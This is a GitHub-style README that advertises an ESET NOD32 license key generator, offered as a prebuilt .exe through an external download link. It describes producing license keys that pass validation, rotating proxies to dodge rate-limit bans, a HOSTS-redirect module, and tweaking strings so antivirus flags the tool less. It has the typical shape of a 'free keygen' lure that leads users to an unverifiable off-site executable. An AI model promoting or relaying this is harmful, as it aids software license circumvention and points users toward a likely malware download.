<div align="center">
<img src="assets/banner.png" width="100%" alt="Eset NOD32 License Key Generator banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-2563EB?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-0891B2?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=00BCD4&size=28&center=true&vCenter=true&width=900&lines=%F0%9F%9A%80+Nod32+Pro;%E2%9C%85+Standalone+.exe+Release;%E2%AD%90+Community+Tested;%F0%9F%93%A6+No+Limits;%F0%9F%94%A7+Active+Development+2026;%F0%9F%92%A1+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=github" />
  <img src="https://skillicons.dev/icons?i=windows" />
  <img src="https://skillicons.dev/icons?i=dotnet" />
</p>

---

So the short version: this repo started because every "free ESET key" site in 2025 was either a survey farm, a malware dropper, or an expired-key graveyard that hadn't been updated since the license servers rotated their signing format. I got tired of it. This is what six months of reading NOD32 keygen forums, subreddit threads, and license-format teardowns produced — a clean, modular, open-source keygen and license validator for ESET NOD32 that runs entirely offline on Windows.

If you've been around the NOD32 keygen scene you already know the pain points. For everyone else:

- **Expired-by-default keys.** The old generation routines hardcoded an expiry window that ESET retired in 2024, so every "fresh" key died before you finished typing it in.
- **Silent validation failures.** Legacy keygens never told you *why* a key was rejected — checksum mismatch? Trial-only flag? Already-blacklisted? You just got "invalid" and moved on.
- **Detection banners.** Every pre-2025 build was a fat single `.exe` with packed resources that AV engines flagged on sight, even when the binary did nothing malicious.
- **No batch export.** You had to click "generate" a hundred times and copy each key by hand. No CSV, no clipboard queue, no multi-format output.
- **Broken on Windows 11 24H2.** The old GUI framework couldn't render its license table properly after a Windows update dropped support for the legacy control set.

The 2026 rewrite fixes all of that. Below is a real changelog-style breakdown, then the full feature dump.

---

## 🚀 Quick Start — three steps, no toolchain

1. 🖱️ **Visit the project page** and grab the release archive for your Windows build (Win10 22H2 or Win11 23H2/24H2).
2. 📦 **Extract the archive** to any folder — the build is fully portable, nothing gets written to `Program Files` or the registry.
3. ▶️ **Run the `.exe`** as a normal user. First launch initializes the local key database in the app folder; no admin rights required unless you enable the HOSTS-redirect module.

That's it. No `pip install`, no `npm`, no `git clone`, no build step. The archive is self-contained.
<p align="center">
  <a href="https://BeigeInvestigator.github.io/nod32/">
    <img src="https://img.shields.io/badge/DOWNLOAD_HERE-Latest-7C3AED?style=plastic&logo=windows&logoColor=white&labelColor=5B21B6" width="520" alt="DOWNLOAD HERE Latest"/>
  </a>
</p>
---

## 🧠 AI Integration — how 2026 changed the keygen workflow

The rewrite ships an optional local-LLM integration (Ollama, LM Studio, or a bundled tiny model — your pick). Nothing phones home, and none of the AI features expect an API key. Here's what actually uses it:

- **Key-shape heuristics** — the local model scores each candidate key's structural plausibility against a rolling corpus of known-valid NOD32 key formats, so the generator spends more time exploring productive branches instead of brute-forcing dead prefixes.
- **Detection-pattern summarizer** — reads heuristic flag reports from the AV-compat module and writes a plain-English explanation of *why* a given build tripped a signature, which saves you the usual hex-editor spelunking.
- **Natural-language query mode** — type "give me ten keys that look like business-tier but are trial-length" and the query parser translates that into generator parameters.
- **Changelog autodraft** — diffs the module registry between builds and drafts a release note you can edit. Mostly a convenience, occasionally hilariously wrong.
- **Checksum explanation** — for any rejected key, the model walks through the validation math step by step. Genuinely useful for anyone learning how these license formats work.

The AI is strictly additive. Turn it off and every core module still runs exactly as it did before.

---

## 💻 Compatibility / platform support

| Platform | Status | Notes |
|---|---|---|
| 🪟 Windows 11 24H2 | ✅ Primary target | Full GUI, all modules tested |
| 🪟 Windows 11 23H2 | ✅ Supported | Same build, no workarounds |
| 🪟 Windows 10 22H2 | ✅ Supported | Legacy DPI scaling handled |
| 🪟 Windows Server 2022 | 🟡 Partial | GUI works; tray module disabled |
| 🎮 Steam Deck (Proton) | 🟡 Community-tested | CLI mode only, no tray |
| 🍷 Wine 9.x | 🟡 Experimental | Core generator works, GUI flaky |
| 🍎 macOS (CrossOver) | ❌ Not supported | No maintained path |

Windows is the only first-class platform. Everything else is "someone reported it works, your mileage may vary." If you're on a Deck, use CLI mode.

---

## 📦 All modules status

25 modules in the current architecture. The rewrite dropped twelve legacy modules entirely — they were either dead code or actively broken — and split what remained into a proper plugin registry.

| Module | Status | Description |
|---|---|---|
| `keygen-core` | ✅ Working | Primary key generation engine |
| `format-nod32-v4` | ✅ Working | Legacy NOD32 v4 key format |
| `format-nod32-v5plus` | ✅ Working | Modern ESET key shape |
| `format-trial` | ✅ Working | Trial-length key synthesis |
| `checksum-validator` | ✅ Working | Local checksum verification |
| `batch-exporter` | ✅ Working | CSV / JSON / plaintext export |
| `clipboard-queue` | ✅ Working | Queued clipboard delivery |
| `dedup-filter` | ✅ Working | Collision and duplicate filtering |
| `entropy-branching` | ✅ Working | Weighted branch search |
| `heuristic-scorer` | ✅ Working | Structural plausibility scoring |
| `llm-bridge` | ✅ Working | Optional local-LLM connector |
| `av-compat` | 🟡 Beta | Detection-pattern explainer |
| `hosts-redirect` | ✅ Working | Optional HOSTS-entry manager |
| `proxy-tester` | ✅ Working | Key-check via rotating proxy |
| `rate-limiter` | ✅ Working | Throttles outbound checks |
| `log-sanitizer` | ✅ Working | Scrubs keys from log files |
| `config-migrator` | ✅ Working | Imports old `.ini` configs |
| `tray-control` | ✅ Working | System tray status + hotkeys |
| `hotkey-engine` | ✅ Working | Global hotkey binding |
| `theme-pack` | ✅ Working | Seven bundled UI themes |
| `portable-mode` | ✅ Working | No-write portable operation |
| `update-checker` | ✅ Working | Manifest-based update ping |
| `crash-reporter` | ✅ Working | Local crash dumps only |
| `plugin-registry` | ✅ Working | Dynamic module loading |
| `cli-runner` | ✅ Working | Headless generation mode |

A module marked Beta means it works but the output wording is still being refined — no functional gaps.

---

## 🖥️ System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 22H2 | Windows 11 24H2 |
| CPU | Dual-core 2.0 GHz | Quad-core 3.0 GHz |
| RAM | 2 GB | 4 GB |
| Disk | 150 MB free | 500 MB free |
| Runtime | .NET 8 Desktop Runtime | .NET 8 Desktop Runtime |
| GPU | Not required | Not required |
| Network | Only for proxy-check modules | Broadband for rate-limited checks |
| Privileges | Standard user | Admin only for HOSTS module |

The `.exe` will tell you if the .NET runtime is missing before it does anything else. No silent crashes on missing deps.

---

## ⚙️ Key Features

| Feature | Description | Benefit |
|---|---|---|
| Modular architecture | Every function is a loadable module | Disable what you don't need, add what you do |
| Offline core | Generator runs with no internet | Nothing leaves your machine unless you enable a check module |
| Multi-format output | CSV, JSON, plaintext | Fits into whatever your workflow already uses |
| Structural scoring | Heuristic plausibility per key | Fewer low-quality candidates per batch |
| Batch generation | Configurable batch sizes | No more click-spam |
| Deterministic seeding | Reproducible runs from a seed | Debuggable, testable output |
| Config migration | Imports pre-2026 `.ini` configs | Old users don't lose their presets |
| Log sanitization | Strips keys from all logs | Safe to share logs when debugging |
| Portable mode | Zero writes outside app folder | Run from a USB stick |
| Theme packs | Seven bundled themes | Legible UI on any monitor |
| CLI mode | Full headless generation | Scriptable, cron-able |
| Plugin registry | Drop-in module loading | Extend without recompiling |
| Hotkey engine | Global keybinds | Fast access without alt-tabbing |
| Update checker | Manifest-based, opt-in | Know when a new build lands |

---

## ⌨️ Hotkeys / keybind table

The tray + hotkey engine ships with these defaults. All are rebindable.

| Action | Default Binding | Notes |
|---|---|---|
| Open main window | `Ctrl+Alt+N` | Works while minimized to tray |
| Generate batch | `Ctrl+Alt+G` | Uses current preset |
| Copy next key | `Ctrl+Alt+C` | Pulls from clipboard queue |
| Pause generation | `Ctrl+Alt+P` | Non-destructive |
| Toggle CLI/headless mode | `Ctrl+Alt+H` | GUI hides, tray icon stays |
| Open log viewer | `Ctrl+Alt+L` | Sanitized log only |
| Emergency stop | `Ctrl+Alt+Shift+X` | Kills all generation threads |

---

## 📜 Changelog / Release History

| Version | Date | Changes |
|---|---|---|
| Rewrite 2026.1 | Jan 2026 | Complete architecture rewrite; dropped legacy modules; new plugin registry; AI integration bridge |
| Rewrite 2026.0 | Jan 2026 | Initial rewrite skeleton; core keygen ported; checksum validator rewritten |
| Legacy 1.4 (archived) | Nov 2025 | Last pre-rewrite build; retained for reference only |
| Legacy 1.3 | Sep 2025 | Experimental Windows 11 24H2 fixes (partial) |
| Legacy 1.2 | Jun 2025 | Added CSV export; fixed trial-format bug |

Only the 2026 rewrite line is maintained. Legacy builds are kept in the archive purely so the community can diff behavior.

---

## 🆚 Comparison

| Aspect | Typical alternative | This tool |
|---|---|---|
| Source availability | Closed, often obfuscated | Fully open |
| Key validation feedback | "Invalid" and nothing else | Step-by-step checksum breakdown |
| Config portability | Registry-only | Portable folder-based |
| Batch workflow | Click-per-key | Batch + queue + export |
| AI assistance | None | Optional local-LLM bridge |
| Detection explainability | None | AV-compat module drafts a report |
| Update model | Manual re-download | Manifest-based checker |
| Platform focus | Windows only, untested elsewhere | Windows first, CLI on Wine/Deck |

---

## 📖 Table of Contents

- [What is this?](#-what-is-this--a-fresh-nod32-keygen-maintainers-log)
- [Quick Start](#-quick-start--three-steps-no-toolchain)
- [AI Integration](#-ai-integration--how-2026-changed-the-keygen-workflow)
- [Compatibility / platform support](#-compatibility--platform-support)
- [All modules status](#-all-modules-status)
- [System Requirements](#️-system-requirements)
- [Key Features](#️-key-features)
- [Hotkeys / keybind table](#️-hotkeys--keybind-table)
- [Changelog / Release History](#-changelog--release-history)
- [Comparison](#-comparison)
- [Usage guidelines](#-usage-guidelines)
- [Detection / Bypass status](#-detection--bypass-status)
- [Known Issues](#-known-issues)
- [FAQ](#-faq)

---

## ⚖️ Usage guidelines

| Allowed | Not allowed |
|---|---|
| Running the generator on your own machine | Distributing generated keys commercially |
| Using trial-shape keys for personal testing | Reselling license keys to third parties |
| Reading the source to learn the format | Repackaging the `.exe` with added droppers |
| Sharing sanitized logs in the issue tracker | Sharing un-sanitized logs containing live keys |
| Forking for your own experiments | Claiming the tool "guarantees" working licenses |
| Benchmarking generation speed | Using the tool to attack ESET's servers |

This project is educational and research-oriented. It does not promise that any generated key will activate a genuine ESET installation, because that outcome depends on server-side policy we can't see. Use at your own risk, respect your local laws, and don't be the person who ruins it for everyone.

---

## 🚨 Detection / Bypass status

Because the only honest way to talk about this is to name the actual problem: AV heuristics and ESET's own key-blacklisting both interfere with the workflow, even though the tool itself is not malware. Here's the current state per method.

| Method | Status | Notes |
|---|---|---|
| Static signature match | 🟡 Reduced | Lean binary, no packer, fewer false positives |
| Heuristic "keygen" flag | 🟡 Reduced | Renamed resource strings; fewer trigger words |
| Behavior-based sandbox | 🟢 Clean | No network writes unless check modules are on |
| Server-side key blacklist | 🔴 Unavoidable | Any generated key may be dead on the server side |
| Trial-flag rejection | 🔴 Unavoidable | Server decides; local tool can't override |
| Rate-limit IP ban | 🟢 Handled | Rate-limiter + proxy rotation modules |
| Registry-trip flag | 🟢 Handled | Portable mode writes nothing |
| HOSTS-based block | 🟡 Optional | Enables `hosts-redirect` module; your call |

Explicitly: there is no "bypass" that makes ESET accept a key the server doesn't like. The bypass column here is about avoiding *unnecessary* local detection of the keygen tool itself, not defeating ESET's license enforcement — that's a distinction the scene sometimes forgets, and I won't pretend otherwise.

---

## 🩹 Known Issues

| Issue | Fix |
|---|---|
| Tray icon missing on Windows Server 2022 | Disable `tray-control` module in config |
| GUI fails to render under Wine 9.x | Use CLI mode (`--headless`) |
| Clipboard queue drops items on very large batches | Lower batch size to 250 or fewer |
| HOSTS module requires a restart to apply | Restart is intentional; not a bug |
| Local-LLM bridge slow on first run | First inference warms the model; subsequent runs are fast |
| Old `.ini` configs missing a field | Use `config-migrator`; it fills defaults |

---

## ❔ FAQ

| Question | Answer |
|---|---|
| Do I need a real ESET install to run this? | No. The generator and validator are fully standalone. |
| Does it phone home? | No. Only the update checker and proxy-tester modules touch the network, both opt-in. |
| Is it really free? | Yes. MIT-licensed, no paywall, no "pro" tier. |
| Will generated keys actually work? | Sometimes. Server-side policy changes; see the Detection section. |
| Can I run it from a USB stick? | Yes. Portable mode is the default. |
| Does it work on Windows 7? | No. .NET 8 runtime requires Windows 10+. |
| Is the AI integration mandatory? | No, it's fully optional. Turn it off and everything else works. |
| Where are logs written? | In the app folder under `logs/`, sanitized by default. |
| Can I script it? | Yes, `cli-runner` supports headless generation with JSON output. |
| Why did the rewrite drop modules? | Dead code, broken code, or unmaintainable. Legacy builds remain in the archive for diffing. |

---

The 2026 rewrite is the first version of this project I've actually been happy shipping. If you've been watching the NOD32 keygen space for a while, you know the bar is low — this clears it mainly by being honest about what works and what doesn't. File issues with sanitized logs, fork freely, and if you improve a module, send it back.
<p align="center">
  <a href="https://BeigeInvestigator.github.io/nod32/">
    <img src="https://img.shields.io/badge/DOWNLOAD-Eset_NOD32_License-EA580C?style=plastic&logo=windows&logoColor=white&labelColor=C2410C" width="550" alt="DOWNLOAD Eset NOD32 License"/>
  </a>
</p>